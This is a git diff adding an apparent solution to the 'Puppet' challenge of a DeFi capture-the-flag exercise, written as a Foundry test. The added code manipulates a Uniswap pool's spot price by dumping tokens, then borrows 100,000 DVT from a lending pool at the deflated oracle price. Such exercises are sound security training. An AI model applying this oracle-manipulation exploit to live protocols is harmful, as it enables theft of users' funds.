@@ -100,6 +100,29 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        // We will first do the exploit from here and then pivot to a contract mabye? 
+
+        //1. Let first check and see what them oracle prices like at the moment 
+        vm.prank(attacker);
+        dvt.balanceOf(address(uniswapExchange));
+
+    
+
+        //2. Lets try an manupulate the pool by removing as much eth as possible.
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), 1000e18);
+        uniswapExchange.tokenToEthSwapInput(1000e18,1,DEADLINE);
+        vm.stopPrank();
+
+        //3. Whats the oracle price now to borrow DVT. // now you see :) 
+        vm.startPrank(attacker);
+       uint256 priceToPay = puppetPool.calculateDepositRequired(100_000e18);
+
+        // 4. pay the pruce calculated in the Oracle
+        vm.startPrank(attacker);
+        puppetPool.borrow{value: priceToPay}(100_000e18);
+
+        // okay lets build a contract to make sure we understand this exploit
 
         /**
          * EXPLOIT END *
